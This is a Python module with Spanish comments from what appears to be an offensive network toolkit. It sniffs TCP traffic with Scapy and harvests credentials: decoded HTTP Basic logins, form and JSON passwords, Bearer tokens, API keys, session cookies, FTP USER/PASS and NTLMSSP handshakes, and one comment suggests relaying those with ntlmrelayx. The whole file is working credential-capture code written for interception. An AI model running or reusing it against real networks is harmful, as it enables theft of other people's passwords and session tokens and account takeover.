"""Captura de credenciales y tokens del trafico que pasa por nuestra maquina.

Detecta HTTP Basic, formularios POST (urlencoded y JSON), cookies de sesion,
tokens Bearer, API keys, FTP y negociaciones NTLMSSP. Todo se guarda SOLO en
memoria (nunca a disco) y se puede exportar o limpiar desde la interfaz.
"""
import base64
import re
import threading
import time

from scapy.all import IP, Raw, TCP, AsyncSniffer

from core.bus import bus

# Formularios urlencoded: user=...&password=...
_FIELD_RE = re.compile(r"(user(?:name)?|pass(?:word|wd)?|email|login|pwd|secret)=([^&\s]+)", re.I)
# Cuerpos JSON: {"password": "..."}
_JSON_RE = re.compile(rb'"(user(?:name)?|pass(?:word|wd)?|email|login|pwd|secret|token|api[_-]?key)"\s*:\s*"([^"\s]{4,})"', re.I)
_BASIC_RE = re.compile(r"Authorization:\s*Basic\s+(\S+)", re.I)
_BEARER_RE = re.compile(r"Authorization:\s*(?:Bearer|token)\s+(\S+)", re.I)
_APIKEY_RE = re.compile(r"(?:x-api-key|api-key|x-auth-token|access[_-]token)\s*[:=]\s*([\w\-\.]{8,})", re.I)
_COOKIE_RE = re.compile(r"Cookie:\s*([^\r\n]{8,})", re.I)
_FTP_RE = re.compile(r"^(USER|PASS)\s+(\S+)", re.I | re.M)
_NTLM_MAGIC = b"NTLMSSP"
_NTLM_TYPES = {b"\x01\x00\x00\x00": "negociar", b"\x02\x00\x00\x00": "desafio",
               b"\x03\x00\x00\x00": "autenticar"}


class CredSniffer:
    MAX_BUFFER = 500

    def __init__(self, iface: str):
        self.iface = iface
        self._sniffer: AsyncSniffer | None = None
        self._lock = threading.Lock()
        self._buffer: list[dict] = []
        self._seen: dict[str, None] = {}  # dedupe simple con orden estable

    # ------------------------------------------------------------------ proceso
    def _process(self, pkt) -> None:
        if not pkt.haslayer(Raw):
            return
        try:
            load_bytes = pkt[Raw].load
            load = load_bytes.decode(errors="ignore")
        except Exception:
            return
        src = pkt[IP].src if pkt.haslayer(IP) else "?"
        dst = pkt[IP].dst if pkt.haslayer(IP) else "?"

        m = _BASIC_RE.search(load)
        if m:
            try:
                decoded = base64.b64decode(m.group(1)).decode(errors="ignore")
                self._emit("HTTP-Basic", decoded, src, dst)
            except Exception:
                pass

        m = _BEARER_RE.search(load)
        if m:
            self._emit("Token-Bearer", m.group(1)[:80], src, dst)

        m = _APIKEY_RE.search(load)
        if m:
            self._emit("API-Key", m.group(1)[:80], src, dst)

        m = _COOKIE_RE.search(load)
        if m:
            cookie = m.group(1).strip()
            # Solo cookies que huelen a sesion, para no inundar la UI.
            if re.search(r"(sess|sid|auth|token|jwt|remember)", cookie, re.I):
                self._emit("Cookie", cookie[:120], src, dst)

        if load.startswith(("POST", "PUT", "GET")) or "password" in load.lower():
            fields = _FIELD_RE.findall(load)
            if fields:
                self._emit("HTTP-Form", str(dict(fields))[:160], src, dst)

        for k, v in _JSON_RE.findall(load_bytes):
            self._emit("JSON-Cred", f"{k.decode()}={v.decode(errors='ignore')}"[:120], src, dst)

        if pkt.haslayer(TCP) and 21 in (pkt[TCP].sport, pkt[TCP].dport):
            for verb, value in _FTP_RE.findall(load):
                self._emit("FTP", f"{verb.upper()} {value}", src, dst)

        if _NTLM_MAGIC in load_bytes[:8]:
            kind = _NTLM_TYPES.get(load_bytes[8:12], "?")
            self._emit("NTLMSSP", f"mensaje de {kind} (relaya con ntlmrelayx)", src, dst)

    # ------------------------------------------------------------------ buffer
    def _emit(self, proto: str, data: str, src: str, dst: str) -> None:
        key = f"{proto}|{data}|{src}"
        if key in self._seen:
            return
        self._seen[key] = None
        if len(self._seen) > 2000:
            self._seen.clear()
        entry = {"ts": time.strftime("%H:%M:%S"), "proto": proto,
                 "data": data, "src": src, "dst": dst}
        with self._lock:
            self._buffer.append(entry)
            if len(self._buffer) > self.MAX_BUFFER:
                self._buffer.pop(0)
        bus.emit({"type": "cred", "proto": proto, "data": data, "src": src, "dst": dst})

    def export(self) -> list[dict]:
        with self._lock:
            return list(self._buffer)

    def clear(self) -> None:
        with self._lock:
            self._buffer.clear()
        self._seen.clear()
        bus.emit({"type": "cred", "proto": "info", "data": "Buffer de credenciales limpiado",
                  "src": "", "dst": ""})

    # ------------------------------------------------------------------ ciclo de vida
    def start(self) -> None:
        self._sniffer = AsyncSniffer(iface=self.iface, filter="tcp",
                                     prn=self._process, store=False)
        self._sniffer.start()
        bus.emit({"type": "cred", "proto": "info", "data": "Captura de credenciales activa (solo en memoria)",
                  "src": "", "dst": ""})

    def stop(self) -> None:
        if self._sniffer:
            try:
                self._sniffer.stop()
            except Exception:
                pass
        bus.emit({"type": "cred", "proto": "info", "data": "Captura detenida (el buffer se conserva hasta exportar o limpiar)",
                  "src": "", "dst": ""})
